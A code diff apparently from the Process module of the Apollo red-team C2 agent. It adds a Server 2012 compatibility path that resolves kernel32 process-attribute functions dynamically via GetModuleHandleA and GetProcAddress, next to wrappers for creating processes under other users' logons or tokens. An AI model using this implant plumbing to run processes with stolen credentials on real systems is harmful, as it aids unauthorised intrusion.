@@ -1,4 +1,6 @@
-﻿using ApolloInterop.Classes.Api;
+﻿#define SERVER2012_COMPATIBLE
+
+using ApolloInterop.Classes.Api;
 using ApolloInterop.Classes.Core;
 using ApolloInterop.Classes.Events;
 using ApolloInterop.Interfaces;
@@ -50,7 +52,7 @@ namespace Process
         private IntPtr _unmanagedEnv;
 
         #region Delegate Typedefs
-        // advapi32
+        #region ADVAPI32
         private delegate bool LogonUser(
             String lpszUserName,
             String lpszDomain,
@@ -96,8 +98,16 @@ namespace Process
             [MarshalAs(UnmanagedType.LPWStr)]String lpCurrentDirectory,
             [In] ref StartupInfoEx lpStartupInfo,
             out ProcessInformation lpProcessInformation);
+        #endregion
+        #region KERNEL32
 
-        // Kernel32
+        private delegate IntPtr GetModuleHandleA(
+            [MarshalAs(UnmanagedType.LPStr)]string lpModuleName);
+
+        private delegate IntPtr GetProcAddress(
+            IntPtr hModule,
+            [MarshalAs(UnmanagedType.LPStr)] string lpProcName);
+
         private delegate bool CreatePipe(out SafeFileHandle phReadPipe, out SafeFileHandle phWritePipe, SecurityAttributes lpPipeAttributes, uint nSize);
         private delegate bool SetHandleInformation(SafeFileHandle hObject, int dwMask, uint dwFlags);
         private delegate IntPtr OpenProcess(
@@ -148,10 +158,15 @@ namespace Process
             IntPtr hProcess,
             out int lpExitCode);
         private delegate void CloseHandle(IntPtr hHandle);
-
+        #endregion
+        #region USERENV
         // Userenv.dll
         private delegate bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
         private delegate bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
+        #endregion
+
+        private GetModuleHandleA _pGetModuleHandleA;
+        private GetProcAddress _pGetProcAddress;
 
         private CreateProcessAsUser _pCreateProcessAsUser;
         private CloseHandle _pCloseHandle;
@@ -187,13 +202,39 @@ namespace Process
             _pCreateProcessWithLogonW = _agent.GetApi().GetLibraryFunction<CreateProcessWithLogonW>(Library.ADVAPI32, "CreateProcessWithLogonW");
             _pCreateProcessWithTokenW = _agent.GetApi().GetLibraryFunction<CreateProcessWithTokenW>(Library.ADVAPI32, "CreateProcessWithTokenW");
 
-            _pCreateProcessA = _agent.GetApi().GetLibraryFunction<CreateProcessA>(Library.KERNEL32, "CreateProcessA");
-            _pCreatePipe = _agent.GetApi().GetLibraryFunction<CreatePipe>(Library.KERNEL32, "CreatePipe");
+            #if SERVER2012_COMPATIBLE
+            _pGetModuleHandleA = _agent.GetApi().GetLibraryFunction<GetModuleHandleA>(Library.KERNEL32, "GetModuleHandleA");
+            _pGetProcAddress = _agent.GetApi().GetLibraryFunction<GetProcAddress>(Library.KERNEL32, "GetProcAddress");
+
+            IntPtr hKernel32 = _pGetModuleHandleA("kernel32.dll");
+            IntPtr pInitializeProcThreadAttributeList =
+                _pGetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
+            IntPtr pSetHandleInfo = _pGetProcAddress(hKernel32, "SetHandleInformation");
+            IntPtr pUpdateProcThreadAttribute = _pGetProcAddress(hKernel32, "UpdateProcThreadAttribute");
+
+            IntPtr pDeleteProcThreadAttributeList = _pGetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
+
+
+            _pInitializeProcThreadAttributeList =
+                (InitializeProcThreadAttributeList)Marshal.GetDelegateForFunctionPointer(pInitializeProcThreadAttributeList,
+                    typeof(InitializeProcThreadAttributeList));
+
+            _pSetHandleInformation =
+                (SetHandleInformation)Marshal.GetDelegateForFunctionPointer(pSetHandleInfo,
+                    typeof(SetHandleInformation));
+            
+            _pUpdateProcThreadAttribute = (UpdateProcThreadAttribute)Marshal.GetDelegateForFunctionPointer(pUpdateProcThreadAttribute, typeof(UpdateProcThreadAttribute));
+            _pDeleteProcThreadAttributeList = (DeleteProcThreadAttributeList)Marshal.GetDelegateForFunctionPointer(pDeleteProcThreadAttributeList, typeof(DeleteProcThreadAttributeList));
+            #else
             _pSetHandleInformation = _agent.GetApi().GetLibraryFunction<SetHandleInformation>(Library.KERNEL32, "SetHandleInformation");
-            _pOpenProcess = _agent.GetApi().GetLibraryFunction<OpenProcess>(Library.KERNEL32, "OpenProcess");
             _pInitializeProcThreadAttributeList = _agent.GetApi().GetLibraryFunction<InitializeProcThreadAttributeList>(Library.KERNEL32, "InitializeProcThreadAttributeList");
             _pUpdateProcThreadAttribute = _agent.GetApi().GetLibraryFunction<UpdateProcThreadAttribute>(Library.KERNEL32, "UpdateProcThreadAttribute");
             _pDeleteProcThreadAttributeList = _agent.GetApi().GetLibraryFunction<DeleteProcThreadAttributeList>(Library.KERNEL32, "DeleteProcThreadAttributeList");
+            #endif
+
+            _pCreateProcessA = _agent.GetApi().GetLibraryFunction<CreateProcessA>(Library.KERNEL32, "CreateProcessA");
+            _pCreatePipe = _agent.GetApi().GetLibraryFunction<CreatePipe>(Library.KERNEL32, "CreatePipe");
+            _pOpenProcess = _agent.GetApi().GetLibraryFunction<OpenProcess>(Library.KERNEL32, "OpenProcess");
             _pDuplicateHandle = _agent.GetApi().GetLibraryFunction<DuplicateHandle>(Library.KERNEL32, "DuplicateHandle");
             _pWaitForSingleObject = _agent.GetApi().GetLibraryFunction<WaitForSingleObject>(Library.KERNEL32, "WaitForSingleObject");
             _pGetExitCodeProcess = _agent.GetApi().GetLibraryFunction<GetExitCodeProcess>(Library.KERNEL32, "GetExitCodeProcess");
